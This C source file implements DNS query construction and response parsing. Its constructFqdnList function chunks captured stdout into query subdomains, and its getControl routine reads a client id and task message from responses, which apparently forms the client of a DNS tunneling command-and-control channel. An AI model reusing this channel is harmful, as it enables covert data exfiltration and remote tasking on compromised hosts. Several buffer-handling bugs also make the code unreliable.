/*
 * dns-protocol.c
 *
 *  Created on: Jan 17, 2016
 *      Author: joe
 */

// includes

// includes
#include <stddef.h>	      // NULL = 0
#include <stdio.h>		  // printf
#include <stdlib.h>		  // exit, malloc
#include <arpa/inet.h>	  // htons
#include "dns-protocol.h" // for calling self createDnsRfcQueryString()
#include "dns-packet.h"   // structure definitions and size calculations
#include "bufferHelper.h" // for copyString

#include "sockets.h"
// global variables
unsigned int debug = 1;


/*
 * This module will implement the various functionality associated with
 * sending and receiving dns queries
 *
 * This will be a client side library and is used to interact with any rfc
 * compliant DNS resolving servers,
 *
 */


/*
 * goal - send a dns query packet
 *
 * the sending is implemented by sockets
 *
 * in no particular order we need to do the following before passing a buffer
 * to a socket
 *
 * construct the DNS fields
 *
 *
 */


/*
 * function name - createDnsQueryPacket
 *
 * arguments - _fqdn => The fully qual domain name to go inside QNAME field
 * 						The fqdn typically consists of host.SLD.TLD.
 *
 * 			 - _sendLen => the size of our udp payload for socket functions
 *
 * return value - char pointer to created dns packet
 *
 * comments - dnsQueryBuffer is the buffer returned that represents a complete
 * dns query buffer, "udp payload", which is passed to a socket.
 */
unsigned char *createDnsQueryPacket(unsigned char *_fqdn, int *_sendLen)
{
	// to keep track of put()'s
	int buffIndex = 0;
	unsigned char *dnsQueryPacket;

	struct DNS_HEADER *ptrStructDnsH;
	struct DNS_QUESTION *ptrStructDnsQ;

	/* create and fill in a DNS_HEADER struct */
	ptrStructDnsH = buildDnsHeader(
						TRANSAC_ID,
						QUERYFLAGS,
						QDCOUNT,
						ANCOUNT_NULL,
						NSCOUNT_NULL,
						ARCOUNT_NULL
						);

	/* create and fill in a DNS_QUESTION struct */
	ptrStructDnsQ = buildDnsQuestion(_fqdn, QTYPE_A, QCLASS_IN);

	//printf("[-] Printing DNS Query Message Packet \n");
	//printf("DNS Header Section \n");
	//printf("id -> %u 		\n", ptrStructDnsH->id);
	//printf("flags -> %u 	\n", ptrStructDnsH->flags);
	//printf("qdcode -> %u    \n", ptrStructDnsH->qdcode);
	//printf("ancount -> %u   \n", ptrStructDnsH->ancount);
	//printf("nscount -> %u   \n", ptrStructDnsH->nscount);
	//printf("arcount -> %u   \n", ptrStructDnsH->arcount);
	//printf("---------------------------------- \n");

	//printf("DNS Question Section \n");
	//printf("question -> ");
	//stringPrinter(ptrStructDnsQ->qname, strlen(ptrStructDnsQ->qname)+1);
	//printf("\n");
	//printf("type -> %u 		\n", ptrStructDnsQ->qtype);
	//printf("class -> %u		\n", ptrStructDnsQ->qclass);

	dnsQueryPacket = malloc(sizeof(struct DNS_HEADER) +
							(strlen(ptrStructDnsQ->qname)+1) +
								sizeof(ptrStructDnsQ->qtype) +
									sizeof(ptrStructDnsQ->qclass));

	if(dnsQueryPacket == NULL)
		{
			printf(">>> "
				"*dnsQueryPacket = malloc(sizeof(struct DNS_HEADER) + "
				"<<< \n"
				"malloc returned NULL aka failed... exiting \n");
			//retFlag = 1;
			exit(1);
		}

	// copy each value into *stdoutBuffArg array elements

	/* dns header section field member copy */
	putShort(dnsQueryPacket, &(ptrStructDnsH->id), 		&buffIndex);
	putShort(dnsQueryPacket, &(ptrStructDnsH->flags),   &buffIndex);
	putShort(dnsQueryPacket, &(ptrStructDnsH->qdcode),  &buffIndex);
	putShort(dnsQueryPacket, &(ptrStructDnsH->ancount), &buffIndex);
	putShort(dnsQueryPacket, &(ptrStructDnsH->nscount), &buffIndex);
	putShort(dnsQueryPacket, &(ptrStructDnsH->arcount), &buffIndex);

	/* dns question section field member copy */
	putString(dnsQueryPacket,
					ptrStructDnsQ->qname,
						strlen(ptrStructDnsQ->qname)+1, // +1 for null root
							&buffIndex);

	putShort(dnsQueryPacket, &(ptrStructDnsQ->qtype),  &buffIndex);
	putShort(dnsQueryPacket, &(ptrStructDnsQ->qclass), &buffIndex);

	// buffIndex is the length of our udp datagram aka dns packet
	*_sendLen = buffIndex;

	return dnsQueryPacket;
}

/*
 * function name - createDnsRfcQueryString
 *
 * arguments - qNameArg ~~> "www.hello.com"
 *
 * return value - pointer to rfc query string
 *
 * comments - this function creates a compliant RFC based dns query string name
 * given a query string in common form such as "www.aol.net" or "www.hi.com"
 *
 * Example Input: www.aolweb.com
 * Example Output: 3www6aolweb3com0
 *
 */
unsigned char *createDnsRfcQueryString(unsigned char *qNameArg,
											unsigned int *rfcQNameLengthArg)
{
	if(debug)
	{
		printf("===== createDnsRfcQueryString() =====	\n");
		printf("qNameArg -> %s 		 	 \n", qNameArg);
		printf("rfcQNameArg -> %u 		 \n", *rfcQNameLengthArg);
		printf("--------------------------------- 	    \n");
	}

	unsigned int retFlag = 0; // no errors
	unsigned char *rfcQName;

	// values for creating a rfc compliant dns query string from a normal one
	unsigned char c;
	unsigned int lengthOctetIndex = 0, rfcQNameIndex = 1, qNameArgIndex = 0;
	unsigned int lengthOctetValue = 0;

	// the size of the newly created rfc query name string = strlen(qNameArg)+2
	unsigned int qNameArgLen = 0;
	if( (qNameArgLen = strlen(qNameArg)) <= 0)
	{
		printf(">>> strlen(qNameArg) <= 0) <<< \n");
		printf("return value was less than or equal to 0.. exiting \n");
		//retFlag = 1;
		exit(1);
	}

	// qNameArgLen = 8, we want to allocate 10 bytes.. arg to malloc = 9
	rfcQName = malloc(sizeof(unsigned char)*qNameArgLen+2);

	if(rfcQName == NULL)
	{
		printf(">>> "
			"rfcQNameArg = malloc(sizeof(unsigned char) * qNameArgLen); "
			"<<< \n"
			"malloc returned NULL aka failed... exiting \n");
		//retFlag = 1;
		exit(1);
	}

	// make sure we loop through every char in qNameArg "orig qname string"
	while ( (qNameArgIndex+1) <= qNameArgLen)
	{
		// retrieve first character from qNameArg
		c = qNameArg[qNameArgIndex];
		//printf("qNameArgIndex[%u] - char: %c\n",
		//			qNameArgIndex, qNameArg[qNameArgIndex]);

		if(c == '.')
		{
			// assign length octet index value to rfc query name index value
			lengthOctetIndex = rfcQNameIndex;

			// reset length octet index value for new label section
			lengthOctetValue = 0;

			// increment the query name index by 1
			qNameArgIndex++;

			// increment rfc query name index by 1
			rfcQNameIndex++;
		}
		else
		{
			// not '.' , increment value at length octet index by 1

			// increment value at length octet index by 1.
			lengthOctetValue += 1;
			rfcQName[lengthOctetIndex] = lengthOctetValue;

			// store char at rfc query name index location
			rfcQName[rfcQNameIndex] = c;

			// increment the query name index by 1
			qNameArgIndex++;

			// increment rfc query name index by 1
			rfcQNameIndex++;
		}
	} // done while

	// assign 0 to value at rfc query name index
	rfcQName[rfcQNameIndex] = 0;

	// dereference integer pointer, store the value of rfcQNameLength
	*rfcQNameLengthArg = (qNameArgLen+2);

	if(debug)
		printf("=====/end createDnsRfcQueryString() ==========	  \n");

	return rfcQName;
}

/*
 * function name - createDnsHeader
 *
 * arguments - ?
 *
 * return value - ?
 *
 */
struct DNS_HEADER *buildDnsHeader (
						unsigned short id,
						unsigned short flags,
						unsigned short qdcode,
						unsigned short ancount,
						unsigned short nscount,
						unsigned short arcount
						)
{
	if(debug)
	{
		printf("===== createDnsHeader() ===== \n");
		printf("id -> %u 		\n", id);
		printf("flags -> %u    \n", flags);
		printf("qdcode -> %u    \n", qdcode);
		printf("ancount -> %u   \n", ancount);
		printf("nscount -> %u   \n", nscount);
		printf("arcount -> %u   \n", arcount);
		printf("---------------------------------- \n");
	}

	// allocate memory for the DNS_HEADER structure, this should only be done
	// once for the life cycle of the program
	struct DNS_HEADER *ptrStructDnsH = malloc(sizeof(struct DNS_HEADER));

	if(ptrStructDnsH == NULL)
	{
		printf(">>> "
			"struct DNS_HEADER *ptrStructDnsH = malloc(sizeof(struct "
			"DNS_HEADER)); "
			"<<< \n"
			"malloc returned NULL aka failed... exiting \n");
		exit(1);
	}

	// fill the fields of the DNS HEADER structure
	ptrStructDnsH->id	 	= htons(id);
	ptrStructDnsH->flags 	= htons(flags);
	ptrStructDnsH->qdcode 	= htons(qdcode);
	ptrStructDnsH->ancount 	= htons(ancount);
	ptrStructDnsH->nscount	= htons(nscount);
	ptrStructDnsH->arcount	= htons(arcount);

	if(debug)
		printf("===== /end createDnsHeader() ===== \n");

	return ptrStructDnsH;
}

/*
 * function name - createDnsQuestion
 *
 * arguments -
 *
 * return value - pointer to DNS_QUESTION structure
 *
 * comments - We will malloc 8 bytes for the structure itself, the first 4
 * bytes will have to point to block of memory "contain the address of"
 * a string of size x bytes that holds our qname. So pre-requisits for this
 * function to be called are below
 * 1.) Having an already created qname
 * 2.) Knowing the length of the qname string... including length octets, etc..
 *
 * Let's also have the ability to create a compliant DNS query string based
 * on the received qname Arg, ie, "www.hello.com" is not compliant and would
 * be passed to the appropriate routine.
 */
struct DNS_QUESTION *buildDnsQuestion(unsigned char *qNameArg,
											unsigned short qtypeArg,
												unsigned short qclassArg)
{
	if(debug)
	{
		printf("===== createDnsQuestion() ===== \n");
		printf("qNameArg -> %s 			\n", qNameArg);
		printf("qtype -> %u 			\n", qtypeArg);
		printf("qclass -> %u			\n", qclassArg);
		printf("----------------------------------\n");
	}

	unsigned int rfcQNameLength = 0;
	unsigned char *rfcQName;

	// allocate memory for the DNS_HEADER structure
	struct DNS_QUESTION *ptrStructDnsQ = malloc(sizeof(struct DNS_QUESTION));

	if(ptrStructDnsQ == NULL)
	{
		printf(">>> "
			"struct DNS_QUESTION *ptrStructDnsQ = malloc"
			"(sizeof(struct DNS_QUESTION)); "
			"<<< \n"
			"malloc returned NULL aka failed... exiting \n");
		exit(1);
	}

	// create a compliant DNS query name that returns the string and length
	rfcQName = createDnsRfcQueryString(qNameArg, &rfcQNameLength);

	printf("[-] just built the rfc string \n");
	stringPrinter(rfcQName, rfcQNameLength); printf("\n");

	if(rfcQName == NULL)
	{
		printf(">>> "
			"rfcQName = createDnsRfcQueryString(qnameArg, &rfcQNameLength); "
			"<<< \n"
			" returned null aka error(s) = 1... exiting \n");
		exit(1);
	}

	// alloc memory to hold the qname string.. the passed in qname will be
	// copied to the memory location pointed to by ptrStructDnsQ->qname
    ptrStructDnsQ->qname = malloc(sizeof(unsigned char)*rfcQNameLength);

	// copy qname string argument to the qname member of DNS QUESTION struct
	if (copyString(ptrStructDnsQ->qname, rfcQName, rfcQNameLength) < 0)
	{
		printf(">>> "
			"copyString(ptrStructDnsQ->qname, qnameArg, qnameLengthArg)"
			"<<< \n"
			"malloc returned -1 aka failed... exiting \n");
		exit(1);
	}

	// assigned remaining struct field members
	ptrStructDnsQ->qtype  = htons(qtypeArg);
	ptrStructDnsQ->qclass = htons(qclassArg);

	// return rfcQNameLength to caller
	//*qNameLengthArg = rfcQNameLength;

	if(debug)
		printf("=====/end createDnsQuestion() ===== \n");

	return ptrStructDnsQ;
}


/*
 * function name - buildFqdnList
 *
 * arguments - stdoutChunk => represents a chunk of a larger stdout buffer
 *			   domainName  => represents the second and top level domain
 *
 * return value - pointer to the head node of this list !
 *
 * comments - If no chunking, list should have 1 node excluding head node?
 *
 * 			  When to use strlen vs, custom strlen for non-ascii bytes?
 *
 * 			  Check return values of malloc.. free when?
 *
 * 			  Function is cool because it seperates the functionality of
 * 			  chunking then sending right away, to chunking and store, then send
 * 			  when ever you want at what ever pace and order desired !
 *
 * 			  When appending a std out chunk to domain name, need to add
 * 			  a period to the end of the stdout buff sdfijsdiofjsdf>.<cnn.com
 *
 */
struct FQDN_NODE *constructFqdnList(unsigned char *_stdoutBuffer,
										unsigned char *_domainName,
											int _stdoutSize)
{
	if(debug)
	{
		printf("===== buildFqdnList() ===== \n");
		printf("stdoutBuffer> %s \n", _stdoutBuffer);
		printf("domain-> %s 	 \n", _domainName);
		printf("----------------------------\n");
	}

	// each list member structure defined below
	struct FQDN_NODE *head;
	int chunkSize = 30;
	int domainSize = strlen(_domainName); // error handling.. strlen <= 0
	int mallocAmt = 0;

	printf("chunkSize: %u \n", chunkSize);
	printf("domainSize: %u \n", domainSize);
	printf("stdoutSize: %u \n", _stdoutSize);

	/* allocate memory for head node */
	head = malloc(sizeof(struct FQDN_NODE)); // make sure to free !
	head->fqdn = 0;
	head->size = 0;
	head->next = 0;

	/* create fqdn from stdoutBuffer chunk and _domain */

	// keep track of index into _stdoutBuffer.. while loop here?
	int bytesTransmitted = 0;
	int bytesRemaining = _stdoutSize;

	// while we have not grabbed each byte of stdout
	while(bytesRemaining > 0)
	{
		//printf("bytes transmitted: %u \n", bytesTransmitted);
		//printf("bytes remaining: %u \n\n", bytesRemaining);

		// before pushing to FQDN Node, need to create the FQDN by appending.
		unsigned char fqdn[255];

		if(bytesRemaining <= chunkSize)
		{
			memcpy(fqdn, &(_stdoutBuffer[bytesTransmitted]), bytesRemaining);
			memcpy(&(fqdn[bytesRemaining]), _domainName, domainSize);

			push(head, fqdn, strlen(fqdn)+1);
			bytesTransmitted = bytesRemaining;
			bytesRemaining = 0;
		}
		else // we have at least 1 more than chunkSize bytes left
		{
			memcpy(fqdn, &(_stdoutBuffer[bytesTransmitted]), chunkSize);
			memcpy(&(fqdn[chunkSize]), _domainName, domainSize);

			push(head, fqdn, strlen(fqdn)+1);
			bytesTransmitted = (bytesTransmitted + chunkSize);
			bytesRemaining = (_stdoutSize - bytesTransmitted);
		}

		// clear fqdn
		memset(fqdn, '\0', 255);
	}

	//printf("bytes transmitted: %u \n", bytesTransmitted);
	//printf("bytes remaining: %u \n", bytesRemaining);

	if(debug)
		printf("=====/end buildFqdnList() ===== \n");

	return head;
}

// this method will be responsible for printing out the
// data field value associated with each node in the list
void printList(struct FQDN_NODE *head)
{
	if(debug)
	{
		printf("\n===== printList() ===== \n");
		//printf("head -> fqdn: %s \n", head->fqdn);
		//printf("head -> size: %u \n", head->size);
		//printf("------------------------\n");
	}

	// create a local pointer to walk the list
	struct FQDN_NODE *current = head;

	// now the value of current = = the value of head
	// they each contain the memory address of the head variable

	// loop through each node in the list and print the value
	while (current->next != NULL)
	{
		// print out the first data field in the list

		// send too
		//sendQuery(current->fqdn, current->size, NULL);
		//sleep(3);
		printf("current ~ fqdn: %s \n", current->fqdn);
		printf("current ~ size: %u \n\n", current->size);

		// at this point, the current pointer still points at head
		// we need to modify the value of current, by assigning it
		// the value associated with its 'next' member
		current = current->next;

		// now the current variable value has been modified and now
		// contains a new memory address corresponding to the next
		// node that had been linked in previously

		// if the value of current = NULL, as would be the case
		// when the end of the list was reached and the next data member
		// had been changed to NULL, then we are at the end of the list
		// ie "node1->next = NULL;"
	}

	// current->next == NULL here.. end of list but we can still print this node
	printf("tail node ~ fqdn: %s \n", current->fqdn);
	printf("tail node ~ size: %u \n", current->size);

	if(debug)
			printf("=====/end printList() ===== \n");
}

// push() aka insertAtFront()..
// need to insertAtEnd()

// bugs --- the head node fields are empty? is this a wasted node space?
// when assigning data to head node, what to make head->next so that no more
// data is assigned to hea node..
void push(struct FQDN_NODE *head,
				unsigned char *_fqdn,
					unsigned int _dataSize)
{
	if(debug)
	{
		printf("===== push() ===== \n");
		//printf("head->fqdn: %s \n", head->fqdn);
		//printf("head->size: %u \n", head->size);
		//printf("head->next: %p \n", head->next);
		//printf("----------------------------\n");
	}

	// if head->next is not null -- there is at least 2 nodes in the entire list
	// enter if statement if head->next is not null (at least 2 node in list)
	// or head->fqdn != NULL (there is one node in the list with data, add 2)
	if (head->next != NULL || head->fqdn != NULL)
	{
		// 0.) allocate memory for new node
		struct FQDN_NODE *newNode = malloc(sizeof(struct FQDN_NODE));

		// 1.) alloc memory for fqdn string member
		newNode->fqdn = malloc(_dataSize);

		// 2.a) assign values at member fqdn
		memcpy(newNode->fqdn, _fqdn, _dataSize);

		// 2.b) assign values at member fqdn
		newNode->size = _dataSize;

		// 2.c) set newNode->next to NULL
		newNode->next = NULL;

		// we need to make sure we are at the end of the list before we add a new one
		struct FQDN_NODE *current = head;

		while (current->next != NULL)
		{
			current = current->next;
		}

		// at end of list now
		current->next = newNode;

	} // end if
	else // else head->next is NULL - there is only 1 node "head"
	{
		// 1.) alloc memory for fqdn string member
		head->fqdn = malloc(_dataSize);

		// 2.a) assign values at member fqdn
		memcpy(head->fqdn, _fqdn, _dataSize);

		// 2.b) assign values at member fqdn
		head->size = _dataSize;

		head->next = NULL; // if this remains null the if will never enter
	}

	if(debug)
		printf("=====/end push() ===== \n");
}


/*
 * function name - parseDnsResponse
 *
 * arguments -
 *
 * return value - ?
 *
 * comments - purpose of function is to parse a dns response. I guess we could
 * 			  implement server control creation here, but leave fields alone
 * 			  incase we need them later?.
 *
 */
struct DNS_RESPONSE_PACKET *parseDnsResponse(unsigned char *_recvBuff,
												int _recvBuffSize)
{
	if(debug)
	{
		printf("===== parseDnsResponse() ===== 	\n");
		printf("_recvBuffer: %s \n",   _recvBuff);
		printf("_recvBuffSize: %u \n", _recvBuffSize);
		printf("----------------------------	\n");
	}

	int buffIndex = 0;
	struct DNS_RESPONSE_PACKET *response;
	response = malloc(sizeof(struct DNS_RESPONSE_PACKET));

	/* fetch dns header fields from reply */
	fetchShort(&(response->dnsHeader.id), 	    _recvBuff, &buffIndex);
	fetchShort(&(response->dnsHeader.flags),    _recvBuff, &buffIndex);
	fetchShort(&(response->dnsHeader.qdcode),   _recvBuff, &buffIndex);
	fetchShort(&(response->dnsHeader.ancount),  _recvBuff, &buffIndex);
	fetchShort(&(response->dnsHeader.nscount),  _recvBuff, &buffIndex);
	fetchShort(&(response->dnsHeader.arcount),  _recvBuff, &buffIndex);

	/* fetch dns question section from reply */
	int qNameLen = strlen(&(_recvBuff[buffIndex])) + 1;
	response->dnsQuestion.qname = malloc(sizeof(unsigned char)*qNameLen);
	fetchString(response->dnsQuestion.qname,    _recvBuff, qNameLen, &buffIndex);
	fetchShort(&(response->dnsQuestion.qtype),  _recvBuff, &buffIndex);
	fetchShort(&(response->dnsQuestion.qclass), _recvBuff, &buffIndex);

	/* fetch dns answer section from reply */
	fetchShort(&(response->dnsAnswer.name),     _recvBuff, &buffIndex);
	fetchShort(&(response->dnsAnswer.type),     _recvBuff, &buffIndex);
	fetchShort(&(response->dnsAnswer.class),    _recvBuff, &buffIndex);
	fetchInt  (&(response->dnsAnswer.ttl),      _recvBuff, &buffIndex);
	fetchShort(&(response->dnsAnswer.rdlength), _recvBuff, &buffIndex);
	fetchInt  (&(response->dnsAnswer.rdata),    _recvBuff, &buffIndex);

    printDnsResponse(response);

	// end func
	if(debug)
		printf("====/end parseDnsResponse() ==== \n");

	// LOOOOOOOOOOOOOL was returning a null pointer.. 0
	return response;
}

void printDnsResponse(struct DNS_RESPONSE_PACKET *resp)
{
	printf("[+] Printing DNS Server Response \n");

	// printing dns header
	printf("\n== DNS HEADER SECTION == \n");
	printf("TRANS ID %hx     \n", ntohs(resp->dnsHeader.id));

	printf("FLAGS: %hx       \n", ntohs(resp->dnsHeader.flags));
	printf("QUEST COUNT: %hx \n", ntohs(resp->dnsHeader.qdcode));
	printf("ANSW RRs: %hx    \n", htons(resp->dnsHeader.ancount));
	printf("AUTH RRs: %hx    \n", htons(resp->dnsHeader.nscount));
	printf("ADDIT RRs: %hx   \n", htons(resp->dnsHeader.arcount));



	// print dns question section
	printf("\n== DNS QUESTION SECTION == \n");
	printf("QUESTION NAME: ");
	stringPrinter(resp->dnsQuestion.qname, strlen(resp->dnsQuestion.qname)+1);
	printf("\n");
	printf("QUESTION TYPE %x  \n",		   ntohs(resp->dnsQuestion.qtype));
	printf("QUESTION CLASS %x \n", 		   ntohs(resp->dnsQuestion.qclass));

	// print answer
	printf("\n== DNS ANSWER SECTION == \n");
	printf("RESPONSE NAME PTR: %hx    \n", ntohs(resp->dnsAnswer.name));
	printf("RESPONSE TYPE: %hx        \n", ntohs(resp->dnsAnswer.type));
	printf("RESPONSE QUERY CLASS: %hx \n", ntohs(resp->dnsAnswer.class));
	printf("RESPONSE TTL -> %x	      \n", ntohl(resp->dnsAnswer.ttl));
	printf("RESPONSE DATA LEN>: %hx   \n", ntohs(resp->dnsAnswer.rdlength));
	printf("RESPONSE DATA: %x         \n", ntohl(resp->dnsAnswer.rdata));
}

void printControlFields(struct CONTROL *c)
{
	printf("[+] Printing Control Fields \n");

	// printing dns header
	printf("Client id: %x \n", 		c->clientId);
	printf("Message Type: %x \n", 	c->messageType);
	printf("Message Length: %x \n", c->messsageLength);
	printf("Message <task>: "); stringPrinter(c->message, 3); printf("\n");
}

// create control struct that is perhaps protocol agnostic
// this is used for parsing responses
// not modifying values of drp, pass by value is ok
// bugs -- if sizeofMessage - "control bytes (2)" > size of label qname[0]
struct CONTROL *getControl(struct DNS_RESPONSE_PACKET *drp)
{
	if(debug)
	{
		printf("===== getControl() ===== 	\n");
	}

	struct CONTROL *ctrl = malloc(sizeof(struct CONTROL));

	int offset = MESSAGE_TYPE_OFFSET;

	/* get messageType */
	fetchChar(&(ctrl->messageType), drp->dnsQuestion.qname, &offset);

	/* get messageLength */
	fetchChar(&(ctrl->messsageLength), drp->dnsQuestion.qname, &offset);

	/* get message itself */
	// 1.) allocate storage for message
	//ctrl->message = malloc(sizeof(ctrl->messsageLength) * sizeof(unsigned char));
	ctrl->message = malloc(3 * sizeof(unsigned char));
	fetchString(ctrl->message,
					drp->dnsQuestion.qname,
						3,
							&offset);

	if(debug)
		printf("====/end getControl() ==== \n");

	return ctrl;
}
